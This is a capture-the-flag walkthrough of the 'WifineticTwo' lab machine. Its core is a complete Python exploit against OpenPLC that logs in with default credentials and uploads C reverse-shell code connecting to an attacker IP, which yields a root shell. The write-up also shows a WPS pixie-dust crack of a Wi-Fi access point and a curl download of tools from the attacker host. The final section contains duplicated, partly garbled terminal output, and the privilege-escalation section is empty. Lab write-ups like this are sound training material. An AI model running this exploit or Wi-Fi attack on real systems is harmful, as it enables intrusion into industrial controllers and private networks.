# WifineticTwo

## 1. Machine General Information

* **Operative System:** Linux
* **Difficulty**: Medium
* **Keywords**:

## 2. Enumeration

### 2.1 Nmap Port Scanning

```
# Nmap 7.94SVN scan initiated Sat Mar 30 00:25:02 2024 as: nmap -sC -Pn -T5 -oN nmap/default-script-scan.nmap 10.10.11.7
Nmap scan report for 10.10.11.7
Host is up (0.35s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was http://10.10.11.7:8080/login

# Nmap done at Sat Mar 30 00:25:07 2024 -- 1 IP address (1 host up) scanned in 5.47 seconds
```

The nmap scan shows only two ports open:

* `22/tcp open ssh OpenSSH 8.2p1`
* `8080/tcp open http-proxy Werkzeug/1.0.1 Python/2.7.18`

### 2.2 Web Server Enumeration

Accessing to the web server it show us a login page to what appears to be an OpenPLC web server.

<figure><img src="../../../../../.gitbook/assets/imagen (22).png" alt=""><figcaption></figcaption></figure>

OpenPLC is an open-source Programmable Logic Controller that is primarily designed to be compatible with industrial, home automation, and educational purposes. The OpenPLC web server provides a graphical user interface (GUI) that can be accessed via a web browser. This GUI allows users to configure and manage the OpenPLC device.&#x20;

We can log in using default credentials:

* `Username: openplc`
* `Password: openplc`

OpenPLC has a Authenticated RCE vulnerability and since we have valid credentials, we can exploit this vulnerability to get access to the machine.

## 3. Exploitation

### 3.1 Exploit automatization with python

To make the exploitation more easy and replicable, i made a python script to do so.

<details>

<summary>openplc_exploit source code</summary>

{% code lineNumbers="true" %}
```python
import requests
import argparse
import textwrap
from io import BytesIO
from time import sleep
from bs4 import BeautifulSoup


session = requests.Session()


def show_usage():
    print("==== Basic usage ====")
    print("TERMINAL_1 > nc -lvnp 6969")
    print("TERMINAL_2 > openplc_exploit.py --ip 10.10.14.50 --port 6969 --target http://wifinetictwo.htb:8080/ -U openplc -P openplc")
    print("TERMINAL_1 > ")



def parse_args():

    arguments = argparse.ArgumentParser()

    arguments.add_argument(
        "--usage",
        help="show usage message",
        action="store_true"
    )

    arguments.add_argument(
        "--ip",
        help="ip address for the reverse connection",
        metavar="ADDR",
        required=True
    )

    arguments.add_argument(
        "--port",
        help="port number to the reverse connection",
        metavar="PORT",
        type=int,
        required=True
    )

    arguments.add_argument(
        "--target",
        help="target url. Example: http://localhost:8080",
        metavar="URL",
        required=True
    )

    arguments.add_argument(
        "-U",
        "--username",
        help="username to log int to openplc web server",
        metavar="USER",
        required=True
    )

    arguments.add_argument(
        "-P",
        "--password",
        help="password to log in to openplc web server",
        required=True
    )

    arguments.add_argument(
        "--payload-program",
        help="structured text openplc format to send to /upload-program",
        default=textwrap.dedent("""
        PROGRAM NoOperation
          VAR
            unused_var: BOOL;
          END_VAR
          unused_var:=FALSE;
        END_PROGRAM
        CONFIGURATION Config0
          RESOURCE Res0 ON PLC
            TASK IdleTask(INTERVAL := T#100ms, PRIORITY := 1);
            PROGRAM IdleInstance WITH IdleTask : NoOperation;
          END_RESOURCE
        END_CONFIGURATION
        """)
    )

    args = arguments.parse_args()

    arguments.add_argument(
        "--payload-hardware",
        help="C code to send to /hardware, change at your own risk.",
        default=textwrap.dedent("""
        #include "ladder.h"
        #include <stdio.h>
        #include <sys/socket.h>
        #include <sys/types.h>
        #include <stdlib.h>
        #include <unistd.h>
        #include <netinet/in.h>
        #include <arpa/inet.h>

        int ignored_bool_inputs[] = {-1};
        int ignored_bool_outputs[] = {-1};
        int ignored_int_inputs[] = {-1};
        int ignored_int_outputs[] = {-1};

        void initCustomLayer(){}

        void updateCustomIn(){}

        void updateCustomOut()
        {
            int port = %s;
            struct sockaddr_in revsockaddr;

            int sockt = socket(AF_INET, SOCK_STREAM, 0);
            revsockaddr.sin_family = AF_INET;       
            revsockaddr.sin_port = htons(port);
            revsockaddr.sin_addr.s_addr = inet_addr("%s");

            connect(sockt, (struct sockaddr *) &revsockaddr, 
            sizeof(revsockaddr));
            dup2(sockt, 0);
            dup2(sockt, 1);
            dup2(sockt, 2);

            char * const argv[] = {"sh", NULL};
            execvp("sh", argv);

            return 0;       
        }
        """ %(args.port, args.ip))
    )

    return arguments.parse_args()
    
    
def login(target:str, username="openplc", password="openplc"):
    """login tries to login to /login using specified credentials to get a session cookie.

    If fail to log in, exit with status code 1.

    Args:
        target (str): url of the target. Example: http://localhost:8080/login
        username (str, optional): username to use in the login.
        password (str, optional): password to use in the login.
    """
    global session

    post_data = {
        "username":username,
        "password":password
    }

    print(f"[!] Trying to log in with credentials {username}:{password}")
    
    try:
        response = session.post(
            url=target,
            data=post_data,
            #proxies={"http":"http://localhost:8080"}
        )
    except:
        print(f"[X] Error while trying to login to {target}")
        exit(1)

    if response.ok:
        try:
            session_cookie = session.cookies.get('session')
        except:
            print("[X] Login failed. No session cookie obtained")
            exit(1)

        print("[!] Successful login")
        print(f"[!] Session Cookie: session={session_cookie}")
    else:
        print(f"[X] Login failed. Status code: {response.status_code}")
        exit(1)


def upload_program(target:str, payload:str):
    """upload_program uploads an openplc structured text program to /upload-program
    
    Args:
        target (str): url of the target. Example: http://target:8080/upload-program
        payload (str): openplc structure text source code.
    """
    global session

    request_data = {
        "file":("code.st",payload),
        "submit":(None, "Upload Program")
    }

    print(f"[!] Sending payload to: {target}")

    try:
        response = session.post(
            target,
            files=request_data,
            #proxies={"http":"http://localhost:8080"}
        )
    except:
        print(f"[X] Error, unable to send post request while uploading program to {target}.")
        exit(1)


    soup = BeautifulSoup(response.text, 'html.parser')
    prog_file = soup.find('input', {'id':'prog_file'}).get('value')
    epoch_time = soup.find('input', {'id':'epoch_time'}).get('value')

    target += "/../upload-program-action"

    request_data = {
        "prog_name":(None, "pwn"),
        "prog_descr":(None, ""),
        "prog_file":(None, prog_file),
        "epoch_time":(None, epoch_time)
    }

    try:
        response = session.post(
            target,
            files=request_data,
            #proxies={"http":"http://localhost:8080"}
        )
    except:
        print(f"[X] Error, unable to send post request while uploading program to {target}.")
        exit(0)    


def upload_hardware_code(target:str, payload:str):
    """upload a c source code to /hardware using blank_linux template. 
    This code is important cause it specifies the instruction to the reverse connection.
    
    Args:
        target (str): url of the target. Example: http://target:8080/hardware
        payload (str): C source code to connect back to our machine.
    """
    global session

    request_data = {
        "hardware_layer":(None,"blank_linux"),
        "custom_layer_code":(None, payload)
    }

    print(f"[!] Sending payload to: {target} ")

    try:
        response = session.post(
            target,
            files=request_data,
            # proxies={"http":"http://localhost:8080"}
        )   
    except:
        print("[X] Error, unable to send post request while sendind payload.")
        exit(0)



def compile_program(target:str):
    """Compile the openplc structured text program.
    
    Args:
        target (str): url of the target. Example: http://target:8080/compile-program?file=1234.st
    """
    global session

    print("[!] Program compilation in curse...")

    try:
        response = session.get(
            target
        )   
    except:
        print("[X] Error, unable to compile program...")
        exit(1)

    if response.ok:
        print("[!] Program compiled successfully...")
    else:
        print(f"[X] Error while compiling program. status code {response.status_code}")
        #exit(1)


def start_plc(target:str):
    """Start the compiled program, this will make the c program in /hardware to be executed.
    
    Args:
        target (str): url of the target. Example: http://target:8080/start_plc
    """
    global session

    print("[!] Starting plc. Check your listener...")

    try:
        response = session.get(
            target
        )   
    except:
        print("[X] Error while starting plc...")
        exit(1)

    if response.ok:
        print("[!] PLC Started successfully.")
    else:
        print("[X] Failed to start PLC...")
        exit(1)


def main():
    global session

    args = parse_args()

    if args.usage:
        show_usage()

    print("=======================")
    print(f"[1]      Target: {args.target}")
    print(f"[2] Credentials: {args.username}:{args.password}")
    print(f"[3] Addr for rev shell: {args.ip}:{args.port}")
    print("=======================\n\n")
    
    login(
        args.target + "/login",
        args.username,
        args.password
    )

    prog_file = upload_program(
        args.target + "/upload-program",
        args.payload_program
    )
    
    upload_hardware_code(
        args.target + "/hardware",
        args.payload_hardware
    )

    compile_program(
        args.target + f"compile-program?file={prog_file}"
    )

    start_plc(
        args.target + "/start_plc"
    )


if __name__ == "__main__":
    main()
```
{% endcode %}

</details>

This script save us from having to send the C source code manually to:

* &#x20;http://wifinetictwo.htb/hardware

And also save us from having to send the openplc structured text program to:

* http://wifinetictwo.htb/upload-program

Using the above script we can get a shell access to the machine.

```
#### TERMINAL 1 ####
$ python3 openplc_exploit.py --ip 10.10.14.50 --port 6969 --target http://wifinetictwo.htb:8080/ -U openplc -P openplc        
=======================
[1]      Target: http://wifinetictwo.htb:8080/
[2] Credentials: openplc:openplc
[3] Addr for rev shell: 10.10.14.50:6969
=======================


[!] Trying to log in with credentials openplc:openplc
[!] Successful login
[!] Session Cookie: session=.eJw9jzFvgzAUhP9K5bkDEFiQOiCZWAzvWUFG1vMStYkbYjBFJFGoo_z3uh063HS6--4ebP-52EvPyutys69sfz6y8sFePljJSKGXus5BmBHCdiDdpSC6zOi2B7FbgXcBQ5Wggw0qyKVoz6QpgG6SmBkonFYpmgJ4lSHvMvLoybU9CkjIocNwSJGPXqp-MHxIScFd6t2vMuOaAnmVx-575Gyitxq-jVxYUVCB6lQYVX9LVaeR_caecftsF_8-2en6_-Z2scvfJfY122keD-z5Awe5TyA.ZhX_8w.3JTVictdXlqp5KT143u37Qkniy4
[!] Sending payload to: http://wifinetictwo.htb:8080//upload-program
[!] Sending payload to: http://wifinetictwo.htb:8080//hardware 
[!] Program compilation in curse...
[X] Error while compiling program. status code 500
[!] Starting plc. Check your listener...

#### TERMINAL 2 #### 
$ nc -lvnp 6969
listening on [any] 6969 ...
connect to [10.10.14.50] from (UNKNOWN) [10.10.11.7] 50128
whoami
root
cat /root/user.txt
SECRETSECRETSECRET
```

Stabilizing the shell:

```
$ script /dev/null -c /bin/bash
CTRL+Z
stty raw -echo; fg
Then press Enter twice:
export TERM=xterm
```

### 3.2 Network Discovery

The machine has a wireless interface that we can use to scan near wifi APs.

```
root@attica01:/opt/PLC/OpenPLC_v3/webserver# iw dev
phy#2
	Interface wlan0
		ifindex 5
		wdev 0x200000001
		addr 02:00:00:00:02:00
		type managed
		txpower 20.00 dBm
root@attica01:/opt/PLC/OpenPLC_v3/webserver# iw dev wlan0 scan 
BSS 02:00:00:00:01:00(on wlan0)
	last seen: 5453.876s [boottime]
	TSF: 1712718050869243 usec (19823d, 03:00:50)
	freq: 2412
	beacon interval: 100 TUs
	capability: ESS Privacy ShortSlotTime (0x0411)
	signal: -30.00 dBm
	last seen: 0 ms ago
	Information elements from Probe Response frame:
	SSID: plcrouter
	Supported rates: 1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 
	DS Parameter set: channel 1
	ERP: Barker_Preamble_Mode
	Extended supported rates: 24.0 36.0 48.0 54.0 
	RSN:	 * Version: 1
		 * Group cipher: CCMP
		 * Pairwise ciphers: CCMP
		 * Authentication suites: PSK
		 * Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)
	Supported operating classes:
		 * current operating class: 81
	Extended capabilities:
		 * Extended Channel Switching
		 * SSID List
		 * Operating Mode Notification
	WPS:	 * Version: 1.0
		 * Wi-Fi Protected Setup State: 2 (Configured)
		 * Response Type: 3 (AP)
		 * UUID: 572cf82f-c957-5653-9b16-b5cfb298abf1
		 * Manufacturer:  
		 * Model:  
		 * Model Number:  
		 * Serial Number:  
		 * Primary Device Type: 0-00000000-0
		 * Device name:  
		 * Config methods: Label, Display, Keypad
		 * Version2: 2.0
root@attica01:/opt/PLC/OpenPLC_v3/webserver# 
```

Seems like there is a near AP called **plcrouter** and has WPS 2.0 enabled. We can use tools like **oneshot** to crack plcrouter using a pixie dust attack.&#x20;

### 3.3 Sending OneShot tool to WifiNetic Machine

We need to clone a copy of **oneshot** tool and compile it as a static binary to send it to wifinetic machine.

```
$ git clone https://github.com/nikita-yfh/OneShot-C       
Cloning into 'OneShot-C'...
remote: Enumerating objects: 32, done.
remote: Counting objects: 100% (32/32), done.
remote: Compressing objects: 100% (32/32), done.
remote: Total 32 (delta 17), reused 4 (delta 0), pack-reused 0
Receiving objects: 100% (32/32), 19.20 KiB | 3.84 MiB/s, done.
Resolving deltas: 100% (17/17), done.

$ cd OneShot-C
```

First, we need to modify `Makefile` to look like this:

```
CC=gcc
CFLAGS=-s -O3
all:
	$(CC) oneshot.c $(CFLAGS) -o oneshot --static
clean:
	rm oneshot
```

Now we compile it using `make` command.

After that we need to start a python3 http server and from the wifinetic machine, send a request to the oneshot binary to download it:

```
TERMINAL_1 > python3 -m http.server 6868
TERMINAL_1 > Serving HTTP on 0.0.0.0 port 6868 (http://0.0.0.0:6868/) ...

TERMINAL_2 > curl -o oneshot http://10.10.14.50:6868/oneshot
TERMINAL_2 > chmod +x oneshot
```

Before executing oneshot, we need to set the interface `wlan0` in monitor mode. We can do that with the next commands:

```
# kill active wpa_supplicant processes
root@attica01:/tmp/file.Kf5# kill -9 $(pidof wpa_supplicant)

# set interface wlan0 down
root@attica01:/tmp/file.Kf5# ifconfig wlan0 down

# set interface wlan0 in monitor mode
root@attica01:/tmp/file.Kf5# iw dev wlan0 type monitor

# set interface wlan0 up
root@attica01:/tmp/file.Kf5# ifconfig wlan0 up
```

Now we can execute `oneshot` using data from the previous AP's scan.

```
root@attica01:/tmp/file.Kf5# ./oneshot -i wlan0 -b 02:00:00:00:01:00 -K 
[*] Running wpa_supplicant...
[*] Trying pin 12345670...
[*] Scanning...
[*] Authenticating...
[+] Authenticated
[*] Associating with AP...
[+] Associated with 02:00:00:00:01:00 (ESSID: plcrouter)
[*] Received Identity Request
[*] Sending Identity Response...
[*] Received WPS Message M1
[P] E-Nonce: 7cc96706ce59a16cc03515e6d775e235
[*] Building Message M2
[P] PKR: 901208fd6b71c0d9f62d3d19c0de7575e6c4bf28885dbccbb2b3a7da1082bce5ab78b1983a5edc72b2b15977640a81aca1157874853c075335267bef1bdf126a66f45404c0b724d3aa9e635c19a57949f85f51d2dec25c034fbc2577c25fada4cffaac5f06f48106caee5c8275d9eb78072ef94b3cf1df49da60145035aeeace08a98151287e1fcfc6246d7c3bc3bb1c3aff2c8cec04c43c5a3585de5fab2a11281e6968c64e9ec12e4965d61ae132eccd0cfcb980fe5be0c78cdfac14bb6713
[P] PKE: 8cd751e62ff5e0e8ec8a4acb7b7a2581d2d9e829f896ea59d5301be336bbdda74568211da5e356a79afc37b8f462b91ccb8ebad743998b04bdda9a02c07dbd52054931444831ac8c18f8d68a48c2086f12bfd20bf3a943a6b6c8bcafd8ecb8c4b7ddd3ee07895701680a3fa8c42a00895c7e535378bc2a4d1ebda0ebc8905c572017ccf69ccaa5c8f1cd8b590597c00a1ba9f0105193214e930e4f75615b51f39ef438dcc16f7c035a195c34f50715c75d2fd49691d682bf07e2830e81aefd42
[P] Authkey: e7e1cc9ba7221860fef6b5c4f0aa50a499b651e31c421259834546b7246df7da
[*] Received WPS Message M3
[P] E-Hash1: bc457c74c149a9d8194f0b1cd3b437efb30cd94cfa3fd6e7265db966f596c8d3
[P] E-Hash2: 4809450b55c0e433a52068ee6bbad90ccd50525c49823cd87865fbbd11e8e62a
[*] Building Message M4
[*] Received WPS Message M5
[*] Building Message M6
[*] Received WPS Message M7
[+] WPS PIN: 12345670
[+] WPA PSK: NoWWEDoKnowWhaTisReal123!
[+] AP SSID: plcrouter
```

### 3.4 Establishing a connection with plcrouter

With the password and SSID of the AP, we can generate a wpa\_passphrase:

```
root@attica01:/tmp/file.Kf5# wpa_passphrase plcrouter NoWWEDoKnowWhaTisReal123!  
root@attica01:/tmp/file.Kf5# cat wpa_supplicant.conf
network={
	ssid="plcrouter"
	#psk="NoWWEDoKnowWhaTisReal123!"
	psk=2bafe4e17630ef1834eaa9fa5c4d81fa5ef093c4db5aac5c03f1643fef02d156
}
```

We can use this passphrase to establish a connection with the plcrouter.







```
root@attica01:..# cd $(mktemp -d /tmp/file.XXX)
root@attica01:/tmp/file.Kf5# ./oneshot -i wlan0 -b 02:00:00:00:01:00 -K 
[*] Running wpa_supplicant...
[*] Trying pin 12345670...
[*] Scanning...
[*] Authenticating...
[+] Authenticated
[*] Associating with AP...
[+] Associated with 02:00:00:00:01:00 (ESSID: plcrouter)
[*] Received Identity Request
[*] Sending Identity Response...
[*] Received WPS Message M1
[P] E-Nonce: 7cc96706ce59a16cc03515e6d775e235
[*] Building Message M2
[P] PKR: 901208fd6b71c0d9f62d3d19c0de7575e6c4bf28885dbccbb2b3a7da1082bce5ab78b1983a5edc72b2b15977640a81aca1157874853c075335267bef1bdf126a66f45404c0b724d3aa9e635c19a57949f85f51d2dec25c034fbc2577c25fada4cffaac5f06f48106caee5c8275d9eb78072ef94b3cf1df49da60145035aeeace08a98151287e1fcfc6246d7c3bc3bb1c3aff2c8cec04c43c5a3585de5fab2a11281e6968c64e9ec12e4965d61ae132eccd0cfcb980fe5be0c78cdfac14bb6713
[P] PKE: 8cd751e62ff5e0e8ec8a4acb7b7a2581d2d9e829f896ea59d5301be336bbdda74568211da5e356a79afc37b8f462b91ccb8ebad743998b04bdda9a02c07dbd52054931444831ac8c18f8d68a48c2086f12bfd20bf3a943a6b6c8bcafd8ecb8c4b7ddd3ee07895701680a3fa8c42a00895c7e535378bc2a4d1ebda0ebc8905c572017ccf69ccaa5c8f1cd8b590597c00a1ba9f0105193214e930e4f75615b51f39ef438dcc16f7c035a195c34f50715c75d2fd49691d682bf07e2830e81aefd42
[P] Authkey: e7e1cc9ba7221860fef6b5c4f0aa50a499b651e31c421259834546b7246df7da
[*] Received WPS Message M3
[P] E-Hash1: bc457c74c149a9d8194f0b1cd3b437efb30cd94cfa3fd6e7265db966f596c8d3
[P] E-Hash2: 4809450b55c0e433a52068ee6bbad90ccd50525c49823cd87865fbbd11e8e62a
[*] Building Message M4
[*] Received WPS Message M5
[*] Building Message M6
[*] Received WPS Message M7
[+] WPS PIN: 12345670
[+] WPA PSK: NoWWEDoKnowWhaTisReal123!
[+] AP SSID: plcrouter
> wpa_supplicant.confle.Kf5# wpa_passphrase plcrouter NoWWEDoKnowWhaTisReal123!  
root@attica01:/tmp/file.Kf5# cat wpa_supplicant.conf
network={
	ssid="plcrouter"
	#psk="NoWWEDoKnowWhaTisReal123!"
	psk=2bafe4e17630ef1834eaa9fa5c4d81fa5ef093c4db5aac5c03f1643fef02d156
}

```

## 4. Privilege Escalation

## 5. References

